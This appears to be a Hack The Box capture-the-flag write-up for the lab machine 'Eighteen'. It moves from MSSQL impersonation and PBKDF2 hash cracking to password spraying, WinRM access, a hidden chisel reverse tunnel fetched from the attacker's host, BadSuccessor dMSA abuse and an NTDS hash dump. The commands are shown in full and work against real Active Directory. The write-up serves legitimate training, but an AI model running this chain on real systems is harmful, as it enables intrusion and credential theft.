---
title: Eighteen [Easy]
date: 2025-11-20
tags: [htb, windows, nmap, chisel, cve-2025-33073, clock skew, mssql, generic kdf, password cracking, password spraying, powershell, faketime, nxc, evil-winrm, impacket-mssqlclient, bloodhound, sharphound, proxychains, bloodyAD, badsuccessor, getST, dmsa, rubeus]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/eighteen-htb-season9
image: /assets/img/eighteen-htb-season9/eighteen-htb-season9_banner.png
---

# Eighteen HTB Season 9
## Machine information
As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: `kevin` / `iNa2we6haRj2gaw!`. <br>
Author: [kavigihan](https://app.hackthebox.com/users/389926)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -p- -Pn -sCV 10.129.xx.xx                                                                                                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 23:04 EST
Nmap scan report for 10.129.xx.xx
Host is up (0.48s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2025-11-16T11:32:49+00:00; +7h00m00s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.xx.xx:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
| ms-sql-info: 
|   10.129.xx.xx:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-16T10:58:31
|_Not valid after:  2055-11-16T10:58:31
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1706.88 seconds
```

This machine also got `clock-skew: 6h59m59s` so we need to `faketime -f '+7h' <commands>`. <br>
Or we can use this bash script [fixtime.sh](https://github.com/5epi0l/ADUtilities/blob/main/FixTime/fixtime.sh) from [ADUtilities](https://github.com/5epi0l/ADUtilities) to help us out.

```bash
└─$ bash fixtime.sh 10.129.xx.xx                                               
==================================================
[*] STARTING WINRM KERBEROS CLOCK SYNC
[*] Target Host: 10.129.xx.xx:5985
==================================================
[*] Stopping system time sync services (to allow manual setting)...
[+] Time sync services disabled.
[*] Querying target for system time via HTTP Date header...
 (Reported as GMT/UTC)me: Sun, 16 Nov 2025 21:15:19 GMT
[*] Setting local clock to reported time...
Sun Nov 16 09:15:19 PM UTC 2025
[+] SUCCESS: Local clock successfully synchronized to target's time.

--- Verification ---
Current Local Time (Your Timezone): Sun Nov 16 04:15:19 PM EST 2025
Current UTC Time (System Base):    Sun Nov 16 09:15:19 PM UTC 2025

[!] Kerberos clock skew is now fixed. You may now retry your attack command.
[*] Re-enabling system time sync services (recommended for stability).
```

From the nmap result, let's add these to `/etc/hosts`.

```bash
10.129.xx.xx     eighteen.htb DC01.eighteen.htb
```

We notice there is port `80` open so let's check it out.

### Web Enumeration
Go to `http://eighteen.htb`.

![Eighteen Website](/assets/img/eighteen-htb-season9/eighteen-htb-season9_website.png)

Let's register account and look around.

![Eighteen Website Register](/assets/img/eighteen-htb-season9/eighteen-htb-season9_website-register.png)

![Eighteen Website Login](/assets/img/eighteen-htb-season9/eighteen-htb-season9_website-login.png)

![Eighteen Website Dashboard](/assets/img/eighteen-htb-season9/eighteen-htb-season9_website-dashboard.png)

Got to `/dashboard`, we found there is section name `Admin`. <br>
&rarr; Let's see if we can access it out.

![Eighteen Website Access Admin Failed](/assets/img/eighteen-htb-season9/eighteen-htb-season9_website-access-admin-failed.png)

As expected, we got failed so let's see if we can do anything around.

![Eighteen Website Dashboard Function](/assets/img/eighteen-htb-season9/eighteen-htb-season9_website-dashboard-function.png)

Nothing special when getting some click button. <br>
&rarr; Let's head over `mssql` service.

### mssql
As we got our provided creds, let's enumerate users. <br>
We can use option `-L` to list all the modules associate with `mssql` to know what we will use.

```bash
└─$ sudo nxc mssql -u kevin -p 'iNa2we6haRj2gaw!' --local-auth -L   
LOW PRIVILEGE MODULES
ENUMERATION
[*] enum_impersonate          Enumerate users with impersonation privileges
[*] enum_links                Enumerate linked SQL Servers and their login configurations.
[*] enum_logins               Enumerate SQL Server logins (SQL, Domain, Local users)
PRIVILEGE_ESCALATION
[*] enable_cmdshell           Enable or disable xp_cmdshell in MSSQL Server
[*] exec_on_link              Execute commands on a SQL Server linked server
[*] link_enable_cmdshell      Enable or disable xp_cmdshell on a linked MSSQL server
[*] link_xpcmd                Run xp_cmdshell commands on a linked SQL server
[*] mssql_coerce              Execute arbitrary SQL commands on the target MSSQL server
[*] mssql_priv                Enumerate and exploit MSSQL privileges

HIGH PRIVILEGE MODULES (requires admin privs)
ENUMERATION
[*] test_connection           Pings a host
CREDENTIAL_DUMPING
[*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
PRIVILEGE_ESCALATION
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
```

We go with `enum_logins` first then we will see `enum_impersonate` that if we can impersonate to another users with better privilege for post exploitation.

```bash
└─$ sudo nxc mssql 10.129.xx.xx -u kevin -p 'iNa2we6haRj2gaw!' --local-auth -M enum_logins
MSSQL       10.129.xx.xx    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.129.xx.xx    1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
ENUM_LOGINS 10.129.xx.xx    1433   DC01             [*] Enumerated logins
ENUM_LOGINS 10.129.xx.xx    1433   DC01             Login Name                          Type            Status
ENUM_LOGINS 10.129.xx.xx    1433   DC01             ----------                          ----            ------
ENUM_LOGINS 10.129.xx.xx    1433   DC01             appdev                              SQL User        ENABLED
ENUM_LOGINS 10.129.xx.xx    1433   DC01             kevin                               SQL User        ENABLED
ENUM_LOGINS 10.129.xx.xx    1433   DC01             sa                                  SQL User        ENABLED
```

So we got `appdev`, `kevin` and `sa`. <br>
&rarr; Check for impersonate.

```bash
└─$ sudo nxc mssql 10.129.xx.xx -u kevin -p 'iNa2we6haRj2gaw!' --local-auth -M enum_impersonate
MSSQL       10.129.xx.xx    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.129.xx.xx    1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
ENUM_IMP... 10.129.xx.xx    1433   DC01             [+] Users with impersonation rights:
ENUM_IMP... 10.129.xx.xx    1433   DC01             [*]   - appdev
```

Okay, so we got the right to imersonate as `appdev`. <br>
&rarr; Let's connect and switch to this user.

```bash
└─$ impacket-mssqlclient eighteen.htb/kevin:'iNa2we6haRj2gaw!'@10.129.xx.xx              
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (kevin  guest@master)>
```

Switching to `appdev`.

```bash
SQL (kevin  guest@master)> exec_as_login appdev
SQL (appdev  appdev@master)>
```

> *These options `exec_as_login` we can get from `help` menu when we type it out.*

Let's continue enum databases.

```bash
SQL (appdev  appdev@master)> enum_db
name                is_trustworthy_on   
-----------------   -----------------   
master                              0   

tempdb                              0   

model                               0   

msdb                                1   

financial_planner                   0
```

Saw `financial_planner` db first hitting so let's go with it.

```bash
SQL (appdev  appdev@master)> USE financial_planner;
ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner
INFO(DC01): Line 1: Changed database context to 'financial_planner'.
```

Now we will enum tables from this database.

```bash
SQL (appdev  appdev@financial_planner)> SELECT * FROM INFORMATION_SCHEMA.TABLES;
[%] SELECT * FROM INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG       TABLE_SCHEMA   TABLE_NAME    TABLE_TYPE   
-----------------   ------------   -----------   ----------   
financial_planner   dbo            users         b'BASE TABLE'   

financial_planner   dbo            incomes       b'BASE TABLE'   

financial_planner   dbo            expenses      b'BASE TABLE'   

financial_planner   dbo            allocations   b'BASE TABLE'   

financial_planner   dbo            analytics     b'BASE TABLE'   

financial_planner   dbo            visits        b'BASE TABLE'
```

We got `users` table as first sight that we can thought of leaking some creds in this.

```bash
SQL (appdev  appdev@financial_planner)> SELECT * FROM users;
[%] SELECT * FROM users;
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03
```

Yes sir! We got the password for admin with associate hash.

```bash
pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
```

We will check with `hashcat` to find match mode with this one.

```bash
└─$ hashcat -h | grep -i pbkdf2                                                                                                
  11900 | PBKDF2-HMAC-MD5                                            | Generic KDF
  12000 | PBKDF2-HMAC-SHA1                                           | Generic KDF
  10900 | PBKDF2-HMAC-SHA256                                         | Generic KDF
<SNIP>
```

The one that match only `10900` so let's crack it out. <br>
To save time, we already ran it and got error so let's searching out `Generic KDF cracking` little bit.

### Generic KDF cracking
We found this blog [crack-gitea-hash](https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash) from `0xdf` and we got to this [thread-8391-post-44775](https://hashcat.net/forum/thread-8391-post-44775.html#pid44775) forum on hashcat. <br>
If we take a look, we can see the how this hash format working out and we need to convert Werkzeug format → Hashcat format.

```bash
└─$ python3 -c "import base64, binascii; h='pbkdf2:sha256:600000\$AMtzteQIG7yAbZIa\$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133'.split('\$'); print(f\"sha256:{h[0].split(':')[2]}:{base64.b64encode(h[1].encode()).decode()}:{base64.b64encode(binascii.unhexlify(h[2])).decode()}\")" > hash.txt
```

```bash
└─$ cat hash.txt          
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```

Or we could use this script from [issuecomment-2415236705](https://github.com/hashcat/hashcat/issues/3205#issuecomment-2415236705). <br>
&rarr; Let's crack it out.

```bash
└─$ hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

```bash
└─$ hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt --show
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:ilovexxxx
```

Got our password `ilovexxxx`. <br>
&rarr; `admin:ilovexxxx`.

Let's use this creds to login back to website and check the `Admin` section to see if we can found anything more.

![Eighteen Website Admin](/assets/img/eighteen-htb-season9/eighteen-htb-season9_website-admin.png)

So there is nothing to discover as no clicking or anything so let's enum more users with rid bruteforcing.

```bash
└─$ sudo nxc mssql DC01.eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
MSSQL       10.129.xx.xx    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.129.xx.xx    1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
MSSQL       10.129.xx.xx    1433   DC01             498: EIGHTEEN\Enterprise Read-only Domain Controllers
MSSQL       10.129.xx.xx    1433   DC01             500: EIGHTEEN\Administrator
MSSQL       10.129.xx.xx    1433   DC01             501: EIGHTEEN\Guest
MSSQL       10.129.xx.xx    1433   DC01             502: EIGHTEEN\krbtgt
MSSQL       10.129.xx.xx    1433   DC01             512: EIGHTEEN\Domain Admins
MSSQL       10.129.xx.xx    1433   DC01             513: EIGHTEEN\Domain Users
MSSQL       10.129.xx.xx    1433   DC01             514: EIGHTEEN\Domain Guests
MSSQL       10.129.xx.xx    1433   DC01             515: EIGHTEEN\Domain Computers
MSSQL       10.129.xx.xx    1433   DC01             516: EIGHTEEN\Domain Controllers
MSSQL       10.129.xx.xx    1433   DC01             517: EIGHTEEN\Cert Publishers
MSSQL       10.129.xx.xx    1433   DC01             518: EIGHTEEN\Schema Admins
MSSQL       10.129.xx.xx    1433   DC01             519: EIGHTEEN\Enterprise Admins
MSSQL       10.129.xx.xx    1433   DC01             520: EIGHTEEN\Group Policy Creator Owners
MSSQL       10.129.xx.xx    1433   DC01             521: EIGHTEEN\Read-only Domain Controllers
MSSQL       10.129.xx.xx    1433   DC01             522: EIGHTEEN\Cloneable Domain Controllers
MSSQL       10.129.xx.xx    1433   DC01             525: EIGHTEEN\Protected Users
MSSQL       10.129.xx.xx    1433   DC01             526: EIGHTEEN\Key Admins
MSSQL       10.129.xx.xx    1433   DC01             527: EIGHTEEN\Enterprise Key Admins
MSSQL       10.129.xx.xx    1433   DC01             528: EIGHTEEN\Forest Trust Accounts
MSSQL       10.129.xx.xx    1433   DC01             529: EIGHTEEN\External Trust Accounts
MSSQL       10.129.xx.xx    1433   DC01             553: EIGHTEEN\RAS and IAS Servers
MSSQL       10.129.xx.xx    1433   DC01             571: EIGHTEEN\Allowed RODC Password Replication Group
MSSQL       10.129.xx.xx    1433   DC01             572: EIGHTEEN\Denied RODC Password Replication Group
MSSQL       10.129.xx.xx    1433   DC01             1000: EIGHTEEN\DC01$
MSSQL       10.129.xx.xx    1433   DC01             1101: EIGHTEEN\DnsAdmins
MSSQL       10.129.xx.xx    1433   DC01             1102: EIGHTEEN\DnsUpdateProxy
MSSQL       10.129.xx.xx    1433   DC01             1601: EIGHTEEN\mssqlsvc
MSSQL       10.129.xx.xx    1433   DC01             1602: EIGHTEEN\SQLServer2005SQLBrowserUser$DC01
MSSQL       10.129.xx.xx    1433   DC01             1603: EIGHTEEN\HR
MSSQL       10.129.xx.xx    1433   DC01             1604: EIGHTEEN\IT
MSSQL       10.129.xx.xx    1433   DC01             1605: EIGHTEEN\Finance
MSSQL       10.129.xx.xx    1433   DC01             1606: EIGHTEEN\jamie.dunn
MSSQL       10.129.xx.xx    1433   DC01             1607: EIGHTEEN\jane.smith
MSSQL       10.129.xx.xx    1433   DC01             1608: EIGHTEEN\alice.jones
MSSQL       10.129.xx.xx    1433   DC01             1609: EIGHTEEN\adam.scott
MSSQL       10.129.xx.xx    1433   DC01             1610: EIGHTEEN\bob.brown
MSSQL       10.129.xx.xx    1433   DC01             1611: EIGHTEEN\carol.white
MSSQL       10.129.xx.xx    1433   DC01             1612: EIGHTEEN\dave.green
```

Let's add some users to a file and then perform the password spraying is we get another users with match password.

```bash
└─$ cat users.txt           
Administrator
mssqlsvc
jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.green
kevin
```

### Password spraying
```bash
└─$ sudo nxc winrm DC01.eighteen.htb -u users.txt -p 'ilovexxxx' --no-bruteforce             
WINRM       10.129.xx.xx    5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) 
WINRM       10.129.xx.xx    5985   DC01             [-] eighteen.htb\Administrator:ilovexxxx
WINRM       10.129.xx.xx    5985   DC01             [-] eighteen.htb\mssqlsvc:ilovexxxx
WINRM       10.129.xx.xx    5985   DC01             [-] eighteen.htb\jamie.dunn:ilovexxxx
WINRM       10.129.xx.xx    5985   DC01             [-] eighteen.htb\jane.smith:ilovexxxx
WINRM       10.129.xx.xx    5985   DC01             [-] eighteen.htb\alice.jones:ilovexxxx
WINRM       10.129.xx.xx    5985   DC01             [+] eighteen.htb\adam.scott:ilovexxxx (Pwn3d!)
```

We got `adam.scott`. <br>
&rarr; Let's `evil-winrm` inside this session.

```bash
└─$ evil-winrm -i dc01.eighteen.htb -u adam.scott -p ilovexxxx
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.scott\Documents>
```

Got inside `adam.scott`.

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> dir


    Directory: C:\Users\adam.scott\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/16/2025   2:02 PM             34 user.txt


*Evil-WinRM* PS C:\Users\adam.scott\Desktop> type user.txt
c615bdxxxxxxxxxxxxxxxxxxxxxxxxxx
```

Grab our `user.txt` flag.

## Initial Access
After we gain inside `adam.scott`, doing some recons.

### Discovery
```powershell
*Evil-WinRM* PS C:\inetpub\eighteen.htb> dir


    Directory: C:\inetpub\eighteen.htb


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/27/2025   1:12 PM                static
d-----         11/8/2025   6:29 AM                templates
-a----         11/8/2025   6:49 AM          10646 app.py
-a----        10/27/2025   1:15 PM             57 requirements.txt
-a----        11/10/2025  12:18 PM            611 web.config


*Evil-WinRM* PS C:\inetpub\eighteen.htb> type app.py
from flask import Flask, render_template, request, redirect, url_for, session, flash
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
import pyodbc
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['SESSION_TYPE'] = 'filesystem'

DB_CONFIG = {
    'server': 'dc01.eighteen.htb',
    'database': 'financial_planner',
    'username': 'appdev',
    'password': 'MissxxxxElitexxx',
    'driver': '{ODBC Driver 17 for SQL Server}',
    'TrustServerCertificate': 'True'
}
<SNIP>
```

Found out another creds in db `appdev:MissxxxxElitexxx` but nothing special when getting this one so we will need some help from `bloodhound`.

### Bloodhound
We will using associate version `SharpHound` and upload it to our current session and give it a run.

```bash
└─$ unzip sharphound-v2.6.6.zip 
Archive:  sharphound-v2.6.6.zip
  inflating: SharpHound.exe          
  inflating: SharpHound.exe.config   
  inflating: SharpHound.pdb          
  inflating: SharpHound.ps1
```

```powershell
*Evil-WinRM* PS C:\inetpub\eighteen.htb> cd $env:TEMP
*Evil-WinRM* PS C:\Users\adam.scott\AppData\Local\Temp> upload SharpHound.exe
                                        
Info: Uploading /home/kali/HTB_Labs/GACHA_Season9/Eighteen/SharpHound.exe to C:\Users\adam.scott\AppData\Local\Temp\SharpHound.exe
                                        
Data: 1713492 bytes of 1713492 bytes copied
                                        
Info: Upload successful!
```

Let's run it out.

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\AppData\Local\Temp> .\SharpHound.exe
2025-11-21T14:16:45.7503996-08:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-11-21T14:16:45.9960332-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-11-21T14:16:46.0428781-08:00|INFORMATION|Initializing SharpHound at 2:16 PM on 11/21/2025
2025-11-21T14:16:46.1435049-08:00|INFORMATION|Resolved current domain to eighteen.htb
2025-11-21T14:16:57.4146060-08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-11-21T14:16:57.5656602-08:00|INFORMATION|Beginning LDAP search for eighteen.htb
2025-11-21T14:16:57.6956048-08:00|INFORMATION|Beginning LDAP search for eighteen.htb Configuration NC
2025-11-21T14:16:57.7272513-08:00|INFORMATION|Producer has finished, closing LDAP channel
2025-11-21T14:16:57.7312704-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-11-21T14:16:57.7787048-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EIGHTEEN.HTB
2025-11-21T14:16:57.7807114-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EIGHTEEN.HTB
2025-11-21T14:16:58.0574102-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EIGHTEEN.HTB
2025-11-21T14:16:58.5235345-08:00|INFORMATION|Consumers finished, closing output channel
2025-11-21T14:16:58.5592739-08:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2025-11-21T14:16:58.7355099-08:00|INFORMATION|Status: 318 objects finished (+318 318)/s -- Using 38 MB RAM
2025-11-21T14:16:58.7355099-08:00|INFORMATION|Enumeration finished in 00:00:01.1967427
2025-11-21T14:16:58.8165574-08:00|INFORMATION|Saving cache with stats: 15 ID to type mappings.
 0 name to SID mappings.
 1 machine sid mappings.
 3 sid to domain mappings.
 0 global catalog mappings.
2025-11-21T14:16:58.8522614-08:00|INFORMATION|SharpHound Enumeration Completed at 2:16 PM on 11/21/2025! Happy Graphing!
```

Now we will download and ingest into our bloodhound.

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\AppData\Local\Temp> download 20251121141658_BloodHound.zip
                                        
Info: Downloading C:\Users\adam.scott\AppData\Local\Temp\20251121141658_BloodHound.zip to 20251121141658_BloodHound.zip
                                        
Info: Download successful!
```

![Eighteen Website Bloodhound](/assets/img/eighteen-htb-season9/eighteen-htb-season9_website-bloodhound.png)

So we just got this infos that `adam.scott` is member of `IT`. <br>
Our next discover will be proxy this back with `chisel` and then enum writeable objects on `adam.scott`.

As our kali is linux that we got already installed it so we need to get the `chisel` with windows binary and head it over `adam.scott` session.

```bash
└─$ wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz

└─$ gunzip chisel_1.9.1_windows_amd64.gz

└─$ mv chisel_1.9.1_windows_amd64 chisel.exe
```

In case if the file is too large for `upload <file>`, we could start python server and then using `wget` to get the file.

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\AppData\Local\Temp> wget -UseBasicParsing http://10.xx.xx.xx/chisel.exe -o chisel.exe
```

Let's start our server side.

```bash
└─$ chisel server --reverse --port 9000 --socks5
2025/11/16 18:03:22 server: Reverse tunnelling enabled
2025/11/16 18:03:22 server: Fingerprint /6aqC4UqAGt3BqEBD8r/kCIxJMRLIktMuAo/gzLOl/4=
2025/11/16 18:03:22 server: Listening on http://0.0.0.0:9000
```

Head back to `adam.scott` session and start the client side to connect back.

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\AppData\Local\Temp> Start-Process -WindowStyle Hidden -FilePath ".\chisel.exe" -ArgumentList "client 10.xx.xx.xx:9000 R:1080:socks"
```

> *With this command, we will start the proccess in background so we can interact with this session after running so that we do not need to create another terminal and access to this session again.*

Look back to our server side.

```bash
2025/11/17 11:21:04 server: session#1: Client version (1.9.1) differs from server version (1.10.1-0kali1)
2025/11/17 11:21:04 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Got the connection back. <br>
&rarr; Let's enum writeable objects on `adam.scott`.

```bash
└─$ proxychains -q bloodyAD --host DC01.eighteen.htb -d eighteen.htb -u 'adam.scott' -p 'ilovexxxx' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=eighteen,DC=htb
permission: WRITE

distinguishedName: OU=Staff,DC=eighteen,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=adam.scott,OU=Staff,DC=eighteen,DC=htb
permission: WRITE
```

We see that our user got `CREATE_CHILD` and `WRITE` permissions and if we notice that from the `nxc` results, we got `Windows 11 / Server 2025 Build 26100` that our target is running `Windows 11 and Server 2025`. <br>
Found out that there is [badsuccessor-vulnerability-in-windows-server-2025-enables-domain-admin-privilege-escalation](https://intruceptlabs.com/2025/05/badsuccessor-vulnerability-in-windows-server-2025-enables-domain-admin-privilege-escalation/) that we can check it out.

Also there is blog [abusing-dmsa-for-privilege-escalation-in-active-directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) from akamai so we can use this to exploit and privilege escalated to `root`. <br>
&rarr; To ensure it vulnerable to this [CVE-2025-33073](https://www.cve.org/CVERecord?id=CVE-2025-33073), we need to verify with [Get-BadSuccessorOUPermissions.ps1](https://github.com/akamai/BadSuccessor/blob/main/Get-BadSuccessorOUPermissions.ps1).

### CVE-2025-33073
Let's upload it out and give it a run.

```powershell
*Evil-WinRM* PS C:\Users\adam.scott\AppData\Local\Temp> .\Get-BadSuccessorOUPermissions.ps1

Identity    OUs
--------    ---
EIGHTEEN\IT {OU=Staff,DC=eighteen,DC=htb}
```

So the `IT` group got the `WRITE` permission on `Staff` that we can also see from checking with `bloodyAD` as well and our user is a member of this group so we can inherit these rights. <br>
&rarr; In order to exploit, we need to get this [BadSuccessor.exe](https://github.com/ibaiC/BadSuccessor/blob/main/BadSuccessor/obj/Debug/BadSuccessor.exe) and escalated it.

## Privilege Escalation
Let's download this [BadSuccessor.exe](https://github.com/ibaiC/BadSuccessor/blob/main/BadSuccessor/obj/Debug/BadSuccessor.exe) and upload to our powershell session. <br>
&rarr; Then we will exploit it out.

### BadSuccessor exploitation
```powershell
*Evil-WinRM* PS C:\Users\adam.scott\AppData\Local\Temp> .\BadSuccessor.exe escalate -targetOU "OU=Staff,DC=eighteen,DC=htb" -dmsa "BAD_DMSA" -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname "BAD_DMSA" -user "adam.scott"

 ______           __ _______
|   __ \ .---.-.--|  |     __|.--.--.----.----.-----.-----.-----.-----.----.
|   __ < |  _  |  _  |__     ||  |  |  __|  __|  -__|__ --|__ --|  _  |   _|
|______/ |___._|_____|_______||_____|____|_____|_____|_____|_____|_____|__|

Researcher: @YuG0rd
Author: @kreepsec

[*] Creating dMSA object...
[*] Inheriting target user privileges
    -> msDS-ManagedAccountPrecededByLink = CN=Administrator,CN=Users,DC=eighteen,DC=htb
    -> msDS-DelegatedMSAState = 2
[+] Privileges Obtained.
[*] Setting PrincipalsAllowedToRetrieveManagedPassword
    -> msDS-GroupMSAMembership = adam.scott
[+] Setting userAccountControl attribute
[+] Setting msDS-SupportedEncryptionTypes attribute

[+] Created dMSA 'BAD_DMSA' in 'OU=Staff,DC=eighteen,DC=htb', linked to 'CN=Administrator,CN=Users,DC=eighteen,DC=htb' (DC: auto)

[*] Phase 4: Use Rubeus or Kerbeus BOF to retrieve TGS and Password Hash
    -> Step 1: Find luid of krbtgt ticket
     Rubeus:      .\Rubeus.exe triage
     Kerbeus BOF: krb_triage BOF

    -> Step 2: Get TGT of Windows 2025/24H2 system with a delegated MSA setup and migration finished.
     Rubeus:      .\Rubeus.exe dump /luid:<luid> /service:krbtgt /nowrap
     Kerbeus BOF: krb_dump /luid:<luid>

    -> Step 3: Use ticket to get a TGS ( Requires Rubeus PR: https://github.com/GhostPack/Rubeus/pull/194 )
    Rubeus:      .\Rubeus.exe asktgs /ticket:TICKET_FROM_ABOVE /targetuser:BAD_DMSA$ /service:krbtgt/domain.local /dmsa /dc:<DC hostname> /opsec /nowrap
```

After abusing DMSA and targeting the `Administrator` in the `Staff OU`. <br>
&rarr; We then request DMSA self-service ticket for `BAD_DMSA$` as `adam.scott` using `getST.py`.

```bash
└─$ proxychains -q getST.py eighteen.htb/adam.scott:ilovexxxx -impersonate 'BAD_DMSA$' -self -dmsa -dc-ip 10.129.xx.xx
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating BAD_DMSA$
[*] Requesting S4U2self
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:<SNIP>
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:<SNIP>
[*] EncryptionTypes.rc4_hmac:<SNIP>
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:<SNIP>
[*] Saving ticket in BAD_DMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

Let's update our environment variables.

```bash
└─$ export KRB5CCNAME='BAD_DMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache'
```

Now we can dump all the ntds data via `nxc smb`.

```bash
└─$ proxychains -q nxc smb dc01.eighteen.htb -k --use-kcache --ntds
SMB         dc01.eighteen.htb 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:eighteen.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.eighteen.htb 445    DC01             [+] eighteen.htb\BAD_DMSA$ from ccache 
SMB         dc01.eighteen.htb 445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc01.eighteen.htb 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56xxxxxxxxxx:::
